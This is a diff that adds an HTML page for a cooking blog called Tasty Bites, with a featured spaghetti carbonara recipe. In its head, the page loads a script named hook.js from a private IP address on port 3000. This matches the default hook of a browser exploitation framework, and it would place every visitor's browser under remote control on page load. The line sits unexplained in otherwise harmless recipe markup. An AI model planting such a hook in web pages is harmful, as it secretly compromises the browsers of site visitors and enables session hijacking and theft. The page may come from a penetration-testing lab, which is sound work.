@@ -1,1 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tasty Bites - Cooking Blog</title>
+    <script src="http://10.0.2.15:3000/hook.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff6347;
+            color: white;
+            text-align: center;
+            padding: 1rem 0;
+        }
+        nav {
+            text-align: center;
+            margin: 1rem 0;
+        }
+        nav a {
+            margin: 0 15px;
+            text-decoration: none;
+            color: #ff6347;
+            font-weight: bold;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 2rem auto;
+            padding: 1rem;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .featured-recipe {
+            text-align: center;
+        }
+        .featured-recipe img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+        .recipe {
+            margin: 2rem 0;
+        }
+        .recipe h3 {
+            color: #ff6347;
+        }
+        footer {
+            text-align: center;
+            padding: 1rem;
+            background-color: #ff6347;
+            color: white;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+</head>
+<body>
 
+    <header>
+        <h1>Welcome to Tasty Bites</h1>
+        <p>Your go-to blog for delicious recipes</p>
+    </header>
+
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Recipes</a>
+        <a href="#">Blog</a>
+        <a href="#">Contact</a>
+    </nav>
+
+    <div class="container">
+        <section class="featured-recipe">
+            <h2>Featured Recipe: Classic Spaghetti Carbonara</h2>
+            <img src="https://via.placeholder.com/800x400.png?text=Spaghetti+Carbonara" alt="Spaghetti Carbonara">
+            <p>Discover the secrets to making a perfect, creamy spaghetti carbonara.</p>
+        </section>
+
+        <section class="recipe">
+            <h3>Ingredients:</h3>
+            <ul>
+                <li>200g Spaghetti</li>
+                <li>100g Pancetta</li>
+                <li>2 Large Eggs</li>
+                <li>50g Pecorino Cheese</li>
+                <li>50g Parmesan Cheese</li>
+                <li>2 Cloves Garlic</li>
+                <li>Black Pepper</li>
+                <li>Salt</li>
+            </ul>
+
+            <h3>Instructions:</h3>
+            <ol>
+                <li>Boil the spaghetti in salted water until al dente.</li>
+                <li>Meanwhile, cook the pancetta in a pan until crispy. Add the garlic and cook until fragrant, then remove the garlic.</li>
+                <li>In a bowl, whisk together the eggs, Pecorino, Parmesan, and black pepper.</li>
+                <li>Drain the spaghetti, reserving some cooking water. Toss the pasta in the pancetta pan and remove from heat.</li>
+                <li>Stir in the egg and cheese mixture, adding reserved water to make it creamy.</li>
+                <li>Serve immediately with extra cheese and black pepper.</li>
+            </ol>
+        </section>
+    </div>
+
+    <footer>
+        &copy; 2024 Tasty Bites. All rights reserved.
+    </footer>
+
+</body>
+</html>
